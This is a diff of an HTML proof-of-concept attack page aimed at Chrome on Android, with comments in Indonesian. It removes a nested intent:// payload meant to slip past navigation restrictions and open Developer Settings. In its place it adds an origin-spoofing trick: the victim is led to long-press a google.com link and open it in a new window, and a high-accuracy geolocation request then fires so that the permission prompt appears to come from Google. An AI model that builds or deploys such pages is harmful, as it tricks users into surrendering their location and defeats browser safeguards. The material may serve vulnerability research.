@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced Chrome Android Bypass PoC</title>
+    <title>Origin Spoofing & Geolocation Permission PoC</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -76,53 +76,66 @@
 </head>
 <body>
 
-    <div class="banner">Advanced Bypass Research Lab</div>
-    <h1>Chrome Android Context & Intent Chaining</h1>
+    <div class="banner">Origin Spoofing Research Lab</div>
+    <h1>Multi-Window Context & Geolocation Prompt</h1>
 
     <div class="container">
-        <!-- Tombol Utama dengan Target Google.com di Atas & Rangkaian Payload di Bawah -->
+        <!-- Tombol Utama dengan Target Google.com di Atas & Pemicu Permission Spoofing di Bawah -->
         <a href="https://www.google.com" class="spoof-link" id="masterBtn">
-            Open Window & Bypass Intent Chain
+            Open Window & Request Location Permission
         </a>
     </div>
 
     <div class="file-info" id="fileInfo">Status: Ready. Long-press the button and select "Open in new window".</div>
-    <div class="footer-note">Target: Chromium Context Separation & Intent Scheme Chaining.</div>
+    <div class="footer-note">Target: Origin Context Confusion & Sensitive Permission Prompt.</div>
 
     <script>
         let isExecuting = false;
 
-        const triggerMasterVector = () => {
+        const triggerOriginSpoofVector = () => {
             if (isExecuting) return;
             isExecuting = true;
 
             const infoBox = document.getElementById("fileInfo");
-            infoBox.innerHTML = `[+] Multi-window split initiated.<br>[*] Synchronizing intent bypass parameters...`;
+            infoBox.innerHTML = `[+] Multi-window split initiated.<br>[*] Synchronizing origin context prompt...`;
 
-            // Jeda 2200ms memberikan waktu optimal bagi window manager Android untuk memisahkan panel atas (google.com)
+            // Jeda waktu 2400ms agar jendela atas (google.com) terbuka sempurna dan membingungkan konteks asal
             setTimeout(() => {
                 try {
-                    infoBox.innerHTML = `[+] Injecting chained intent payload...`;
+                    infoBox.innerHTML = `[+] Requesting high-accuracy geolocation under spoofed origin context...`;
                     
-                    // Logika bypass diperkuat menggunakan skema ganda bersarang (Nested Intent & Fallback URL Encoding)
-                    // Mengarahkan handler internal browser agar melompati proteksi pembatasan navigasi langsung
-                    const targetPayload = "intent://#Intent;action=android.intent.action.VIEW;scheme=https;package=com.android.chrome;S.browser_fallback_url=intent://#Intent;component=com.android.settings/.Settings\$DevelopmentSettingsDashboardActivity;S.com.android.browser.application_id=com.android.chrome;end;end;";
-                    
-                    window.location.href = targetPayload;
+                    // Memanggil Geolocation API secara langsung untuk memicu dialog izin (Permission Prompt) sistem
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(
+                            (position) => {
+                                infoBox.innerHTML = `[+] Location acquired successfully:<br>Lat: ${position.coords.latitude}, Lng: ${position.coords.longitude}`;
+                            },
+                            (error) => {
+                                infoBox.innerHTML = `[-] Permission prompt handled / denied: ${error.message}`;
+                            },
+                            {
+                                enableHighAccuracy: true,
+                                timeout: 10000,
+                                maximumAge: 0
+                            }
+                        );
+                    } else {
+                        infoBox.innerHTML = `[-] Geolocation API not supported in this context.`;
+                    }
                 } catch (err) {
                     infoBox.innerHTML = `[-] Execution trapped: ${err.message}`;
-                    console.debug("Bypass vector error:", err.message);
+                    console.debug("Origin spoof vector error:", err.message);
                 } finally {
                     setTimeout(() => { isExecuting = false; }, 2000);
                 }
-            }, 2200);
+            }, 2400);
         };
 
         const masterElement = document.getElementById("masterBtn");
         
-        // Menangkap aksi long-press (contextmenu) pada Chrome Android secara presisi
+        // Menangkap aksi long-press (contextmenu) pada Chrome Android
         masterElement.addEventListener("contextmenu", (e) => {
-            triggerMasterVector();
+            triggerOriginSpoofVector();
         });
         
         masterElement.addEventListener("touchstart", () => {}, { passive: true });
